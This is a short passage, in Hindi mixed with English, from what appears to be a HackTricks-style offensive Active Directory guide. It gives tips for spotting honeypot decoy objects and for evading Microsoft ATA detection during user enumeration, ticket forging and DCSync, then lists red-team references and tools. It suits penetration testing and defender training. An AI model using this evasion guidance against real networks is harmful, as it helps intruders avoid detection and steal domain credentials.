- **General Indicators**: संभावित decoy objects के attributes की तुलना वास्तविक ऑब्जेक्ट्स के साथ करने से विसंगतियाँ सामने आ सकती हैं। ऐसी पहचान में मदद के लिए [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) जैसे टूल्स उपयोगी हैं।

### **Detection Systems को बायपास करना**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection से बचने के लिए Domain Controllers पर session enumeration से बचें।
- **Ticket Impersonation**: टिकट निर्माण के लिए **aes** keys का उपयोग करने से NTLM पर डाउनग्रेड न करके पहचान से बचने में मदद मिलती है।
- **DCSync Attacks**: ATA detection से बचने हेतु non-Domain Controller से चलाना सलाह योग्य है, क्योंकि Domain Controller से सीधे निष्पादन alerts ट्रिगर करेगा।

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
